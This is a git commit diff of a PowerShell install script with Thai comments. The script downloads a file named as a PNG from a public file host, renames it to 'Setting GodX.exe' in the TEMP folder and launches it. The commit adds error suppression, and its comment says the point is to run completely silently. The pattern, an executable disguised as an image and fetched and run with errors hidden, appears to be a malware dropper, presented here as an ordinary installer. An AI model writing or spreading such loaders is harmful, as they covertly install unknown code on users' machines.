3ad02bc8adb37a5b80d73215488fd9b532638952
arxstore <paphawin.ffaith@gmail.com>
2026-05-24 15:35:06 +0700

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,11 +1,17 @@
+# ปิดการแสดงข้อความให้ทำงานแบบเงียบสนิท
+$ErrorActionPreference = 'SilentlyContinue'
+
 $exeName = "Setting GodX.exe"
+$url = "https://files.catbox.moe/c7lpiz.png"
 $tempPath = "$env:TEMP\GodX_App"
 $exePath = "$tempPath\$exeName"
-$url = "https://files.catbox.moe/c7lpiz.png"
 
-# ใช้ BITS (Background Intelligent Transfer) โหลดให้เร็วที่สุดในระดับ OS
-$job = Start-BitsTransfer -Source $url -Destination "$tempPath\temp.png" -Asynchronous
-while ($job.JobState -eq 'Transferring') { Start-Sleep -Milliseconds 100 }
+# สร้างโฟลเดอร์ทำงาน
+if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath | Out-Null }
 
+# ใช้ BITS ดาวน์โหลด (เร็วที่สุดใน Windows)
+$job = Start-BitsTransfer -Source $url -Destination "$tempPath\temp.png" -TransferType Download -ErrorAction SilentlyContinue
 Rename-Item -Path "$tempPath\temp.png" -NewName $exeName -Force
+
+# รันโปรแกรมแบบ Working Directory
 Start-Process "$exePath" -WorkingDirectory $tempPath
